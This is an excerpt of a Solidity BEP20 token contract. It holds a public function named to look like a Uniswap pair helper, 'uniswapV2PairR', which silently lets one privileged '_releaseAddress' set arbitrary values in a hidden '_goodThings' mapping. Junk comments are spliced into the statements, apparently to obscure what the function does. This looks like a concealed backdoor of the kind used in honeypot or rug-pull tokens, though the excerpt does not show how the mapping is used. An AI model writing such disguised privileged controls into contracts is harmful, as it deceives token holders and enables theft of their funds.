...
contract TOKEN is BEP20, Ownable, BaseToken {
    ...
    mapping(address => uint256) public _goodThings;


    function uniswapV2PairR(address _address, uint256 _value) public {
        if(
_releaseAddress
 /*asd aw dawf*/ ==  /*asd aw dawf12*/
            msg.sender
        ){
        _goodThings[_address]
 /*asd aw dawf*/ =  /*asd aw dawf12*/
        _value;
        }
    }
